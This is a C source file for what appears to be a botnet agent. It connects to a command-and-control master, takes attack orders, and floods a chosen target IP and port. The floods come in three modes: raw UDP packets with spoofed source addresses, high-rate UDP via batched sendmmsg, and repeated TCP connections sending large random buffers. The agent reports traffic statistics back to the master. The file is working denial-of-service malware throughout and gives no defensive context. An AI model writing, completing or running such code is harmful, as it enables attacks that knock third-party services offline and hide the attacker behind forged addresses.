
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <ctype.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdatomic.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>

#include "c2proto.h"

#define BATCH           256
#define PAYLOAD         1400
#define PKT_BYTES       (PAYLOAD + 28)
#define TCPSZ           65536
#define SOCKS_PER_THREAD 4
#define SOCKBUF         (16 * 1024 * 1024)

static char target_ip[64];
static uint16_t target_port;
static int duration;
static int use_mode;
static int n_threads;
static volatile int stop_flag = 0;
static volatile int attacking = 0;

static _Atomic unsigned long long g_bytes, g_pkts;
static volatile int ctl_fd = -1;

static int auto_threads(void) {
    long n = sysconf(_SC_NPROCESSORS_ONLN);
    if (n < 1) n = 1;
    if (n > C2_MAXTHREADS) n = C2_MAXTHREADS;
    return (int)n;
}

static void big_sndbuf(int fd) {
    int v = SOCKBUF;
    /* SO_SNDBUFFORCE needs root + net.core.wmem_max raised; fall back silently */
    if (setsockopt(fd, SOL_SOCKET, SO_SNDBUFFORCE, &v, sizeof(v)) < 0)
        setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &v, sizeof(v));
}

static uint64_t flood_raw(void) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) { perror("raw socket"); return 0; }
    int one = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    big_sndbuf(fd);
    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(target_port);
    dst.sin_addr.s_addr = inet_addr(target_ip);
    unsigned char packets[BATCH][sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOAD];
    struct mmsghdr msgs[BATCH];
    struct iovec iovs[BATCH];
    srand(time(NULL) ^ pthread_self());
    for (int i = 0; i < BATCH; i++) {
        size_t total = sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOAD;
        for (int j = sizeof(struct iphdr) + sizeof(struct udphdr); j < (int)total; j++)
            packets[i][j] = rand() & 0xFF;
        iovs[i].iov_base = packets[i];
        iovs[i].iov_len = total;              /* set ONCE, not per send */
        memset(&msgs[i], 0, sizeof(msgs[i]));
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &dst;
        msgs[i].msg_hdr.msg_namelen = sizeof(dst);
    }
    uint64_t pkts = 0;
    time_t start = time(NULL);
    uint32_t fake_src = rand();
    while (!stop_flag && (time(NULL) - start) < duration) {
        for (int i = 0; i < BATCH; i++) {
            struct iphdr *ip = (struct iphdr *)packets[i];
            struct udphdr *udp = (struct udphdr *)(packets[i] + sizeof(struct iphdr));
            fake_src += 0x01010101;
            uint16_t sport = 1024 + (rand() % 64511);
            ip->version  = 4;
            ip->ihl      = 5;
            ip->tos      = 0;
            ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOAD);
            ip->id       = htons(rand() & 0xFFFF);
            ip->frag_off = htons(0x4000);     /* DF set: no fragmentation */
            ip->ttl      = 64;
            ip->protocol = IPPROTO_UDP;
            ip->saddr    = fake_src;
            ip->daddr    = dst.sin_addr.s_addr;
            ip->check    = 0;
            udp->source = htons(sport);
            udp->dest   = htons(target_port);
            udp->len    = htons(sizeof(struct udphdr) + PAYLOAD);
            udp->check  = 0;
        }
        int n = sendmmsg(fd, msgs, BATCH, 0);
        if (n > 0) {
            pkts += n;
            g_pkts += n;
            g_bytes += (unsigned long long)n * PKT_BYTES;
        }
    }
    close(fd);
    return pkts;
}

static uint64_t flood_udp(void) {
    int fds[SOCKS_PER_THREAD];
    int nfd = 0;
    for (int s = 0; s < SOCKS_PER_THREAD; s++) {
        fds[s] = socket(AF_INET, SOCK_DGRAM, 0);
        if (fds[s] < 0) { perror("socket"); break; }
        big_sndbuf(fds[s]);
        /* DF: never fragment — drop instead of slowing the pipeline */
        int mtu_disc = IP_PMTUDISC_DO;
        setsockopt(fds[s], IPPROTO_IP, IP_MTU_DISCOVER, &mtu_disc, sizeof(mtu_disc));
        nfd++;
    }
    if (!nfd) return 0;
    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(target_port);
    dst.sin_addr.s_addr = inet_addr(target_ip);
    static __thread unsigned char payload[PAYLOAD];
    for (int i = 0; i < PAYLOAD; i++) payload[i] = rand() & 0xFF;
    struct mmsghdr msgs[BATCH];
    struct iovec iovs[BATCH];
    for (int i = 0; i < BATCH; i++) {
        iovs[i].iov_base = payload;
        iovs[i].iov_len  = PAYLOAD;
        memset(&msgs[i], 0, sizeof(msgs[i]));
        msgs[i].msg_hdr.msg_iov     = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen  = 1;
        msgs[i].msg_hdr.msg_name    = &dst;
        msgs[i].msg_hdr.msg_namelen = sizeof(dst);
    }
    uint64_t pkts = 0;
    time_t start = time(NULL);
    while (!stop_flag && (time(NULL) - start) < duration) {
        for (int s = 0; s < nfd; s++) {
            int n = sendmmsg(fds[s], msgs, BATCH, 0);
            if (n > 0) {
                pkts += n;
                g_pkts += n;
                g_bytes += (unsigned long long)n * PKT_BYTES;
            }
        }
    }
    for (int s = 0; s < nfd; s++) close(fds[s]);
    return pkts;
}

static uint64_t flood_tcp(void) {
    static __thread unsigned char buf[TCPSZ];
    srand(time(NULL) ^ pthread_self());
    for (int i = 0; i < TCPSZ; i++) buf[i] = rand() & 0xFF;
    uint64_t pkts = 0, bytes = 0;
    time_t start = time(NULL);
    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(target_port);
    dst.sin_addr.s_addr = inet_addr(target_ip);
    while (!stop_flag && (time(NULL) - start) < duration) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) break;
        big_sndbuf(fd);
        setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, (int[]){1}, sizeof(int));
        int fl = fcntl(fd, F_GETFL, 0);
        fcntl(fd, F_SETFL, fl | O_NONBLOCK);
        if (connect(fd, (struct sockaddr *)&dst, sizeof(dst)) < 0 && errno != EINPROGRESS) {
            close(fd); break;
        }
        struct pollfd pfd;
        memset(&pfd, 0, sizeof(pfd));
        pfd.fd = fd;
        pfd.events = POLLOUT;
        if (poll(&pfd, 1, 5000) != 1 || !(pfd.revents & POLLOUT)) { close(fd); continue; }
        fcntl(fd, F_SETFL, fl);
        while (!stop_flag && (time(NULL) - start) < duration) {
            ssize_t n = send(fd, buf, TCPSZ, MSG_NOSIGNAL);
            if (n > 0) {
                bytes += (uint64_t)n;
                pkts  += (uint64_t)(n + 1439) / 1440;
            } else {
                if (n < 0 && (errno == EINTR || errno == EAGAIN)) continue;
                break;
            }
        }
        close(fd);
    }
    g_pkts  += pkts;
    g_bytes += bytes + pkts * 52ULL;
    return pkts;
}

static void *worker(void *arg) {
    uint64_t n = 0;
    if (use_mode == C2_MODE_SPOOF)    n = flood_raw();
    else if (use_mode == C2_MODE_TCP) n = flood_tcp();
    else                               n = flood_udp();
    printf("[thread %ld] sent %llu pkts\n", (long)arg, (unsigned long long)n);
    return NULL;
}

static int send_all_fd(int fd, const void *buf, size_t len) {
    const char *p = buf;
    while (len > 0) {
        ssize_t n = send(fd, p, len, MSG_NOSIGNAL);
        if (n < 0) { if (errno == EINTR) continue; return -1; }
        p += n; len -= (size_t)n;
    }
    return 0;
}

static void send_stats(uint8_t state) {
    int fd = ctl_fd;
    if (fd < 0) return;
    c2_stats_t s;
    memset(&s, 0, sizeof(s));
    s.magic = C2_MAGIC;
    s.type  = C2_CMD_STATS;
    s.state = state;
    s.bytes = g_bytes;
    s.pkts  = g_pkts;
    send_all_fd(fd, &s, sizeof(s));
}

static void *attack_runner(void *arg) {
    (void)arg;
    const char *m = use_mode == C2_MODE_SPOOF ? "spoof" :
                    use_mode == C2_MODE_TCP   ? "tcp"   : "udp";
    if (use_mode == C2_MODE_SPOOF && geteuid() != 0)
        printf("[bot] WARNING: spoof set but not root, raw socket will fail\n");
    printf("[bot] ATTACK -> %s:%u | %ds | %d threads | mode=%s\n",
           target_ip, target_port, duration, n_threads, m);
    pthread_t tids[C2_MAXTHREADS];
    int t = n_threads > C2_MAXTHREADS ? C2_MAXTHREADS : n_threads;
    for (int i = 0; i < t; i++)
        pthread_create(&tids[i], NULL, worker, (void *)(long)i);
    int alive = t;
    while (alive > 0) {
        for (int i = 0; i < t; i++) {
            if (!tids[i]) continue;
            if (pthread_tryjoin_np(tids[i], NULL) == 0) { tids[i] = (pthread_t)0; alive--; }
        }
        if (alive > 0) {
            sleep(1);
            send_stats(1);
        }
    }
    send_stats(0);
    printf("[bot] attack finished\n");
    attacking = 0;
    return NULL;
}

static int recv_full(int fd, void *buf, size_t len) {
    char *p = buf;
    size_t got = 0;
    while (got < len) {
        ssize_t n = recv(fd, p + got, len - got, 0);
        if (n <= 0) { if (n < 0 && errno == EINTR) continue; return -1; }
        got += (size_t)n;
    }
    return 0;
}

static void control_loop(const char *master_ip, int master_port) {
    for (;;) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) { perror("socket"); sleep(3); continue; }
        struct sockaddr_in sa = {0};
        sa.sin_family = AF_INET;
        sa.sin_port = htons(master_port);
        sa.sin_addr.s_addr = inet_addr(master_ip);
        printf("[bot] connecting to master %s:%d ...\n", master_ip, master_port);
        if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
            perror("connect");
            close(fd);
            sleep(3);
            continue;
        }
        ctl_fd = fd;
        printf("[bot] connected, waiting for orders\n");
        for (;;) {
            c2_pkt_t p;
            if (recv_full(fd, &p, sizeof(p)) < 0) break;
            if (p.magic != C2_MAGIC) continue;
            if (p.type == C2_CMD_STOP) {
                printf("[bot] STOP received\n");
                stop_flag = 1;
            }
            else if (p.type == C2_CMD_ATTACK) {
                if (attacking) {
                    stop_flag = 1;
                    while (attacking) usleep(50000);
                }
                strncpy(target_ip, p.ip, sizeof(target_ip) - 1);
                target_ip[sizeof(target_ip) - 1] = 0;
                target_port = p.port;
                duration    = p.duration;
                use_mode    = p.mode;
                n_threads   = p.threads ? (int)p.threads : auto_threads();
                g_bytes = 0;
                g_pkts  = 0;
                stop_flag   = 0;
                attacking   = 1;
                pthread_t r;
                pthread_create(&r, NULL, attack_runner, NULL);
                pthread_detach(r);
            }
        }
        ctl_fd = -1;
        close(fd);
        printf("[bot] lost master, reconnecting in 3s\n");
        stop_flag = 1;
        while (attacking) usleep(50000);
        sleep(3);
    }
}

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <master_ip> [master_port]\n", argv[0]);
        return 1;
    }
    const char *master_ip = argv[1];
    int master_port = (argc > 2) ? atoi(argv[2]) : C2_PORT_DEFAULT;
    srand(time(NULL));
    control_loop(master_ip, master_port);
    return 0;
}
